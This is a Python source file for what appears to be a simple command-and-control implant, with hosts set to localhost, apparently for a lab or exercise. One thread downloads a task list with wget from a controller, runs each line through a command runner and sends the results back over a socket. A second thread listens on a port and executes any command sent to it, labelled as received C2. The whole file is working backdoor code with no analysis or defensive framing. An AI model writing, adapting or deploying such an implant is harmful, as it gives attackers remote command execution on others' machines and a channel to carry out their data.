import socket
from threading import Thread
import time

import capabilities

def check_tasking(HOST,PORT):
    task_file_command = f"wget http://{HOST}:{PORT}/tasks.txt -O ./tasks-grabbed.txt"

    capabilities.run(task_file_command)

def comms_thread():
    COMMS = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    COMMS.bind(('127.0.0.1',54321))
    COMMS.listen()
    while True:
        COMX,COMX_ADDR = COMMS.accept()
        task = COMX.recv(1024)
        print(f"Received C2: {task.decode()}")

        if "TASK" in task.decode().upper():
            COMX.send(b"Enter your command: ")
            run_me = COMX.recv(1024)
            output = capabilities.run(run_me.decode())
            send_str = f"The result of `{run_me.decode().strip()}` is {output}" 
            COMX.send(send_str.encode())
        else:
            COMX.send((f"I'm not familiar with the task {task.decode().upper()}").encode())

        COMX.close()

def tasking_thread():
    MAX_TIMER = 120
    HOST = "127.0.0.1"
    PORT = 12345

    while True:

        sleep_timer = MAX_TIMER

#------------- Check for Tasking -------------#
        check_tasking(HOST,'9090')

#------------- Execute Tasking -------------#
        tasking_fh = open("./tasks-grabbed.txt",'r')
        for line in tasking_fh.readlines():
            fh_out = open("results.txt",'a')
            fh_out.write(f"---------- {line.strip()} ----------\n")
            output = capabilities.run(line.strip())
            fh_out.write(output)
            fh_out.close()

#------------- Report Results -------------#
        CLIENT = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        CLIENT.connect((HOST,PORT))

        fh = open("results.txt",'r')
        for line in fh.readlines():
            CLIENT.send(line.encode())
        fh.close()
        CLIENT.close()
        print(f"Checking for tasks in {MAX_TIMER//60} minutes...")
        while sleep_timer > 0:
            sleep_timer-=1
            time.sleep(1)

def main():
    threads = []
    tasking = Thread(target=tasking_thread)
    threads.append(tasking)
    tasking.start()

    comms = Thread(target=comms_thread)
    threads.append(comms)
    comms.start()

    for t in threads:
        t.join()

    

if __name__ == "__main__":
    main()
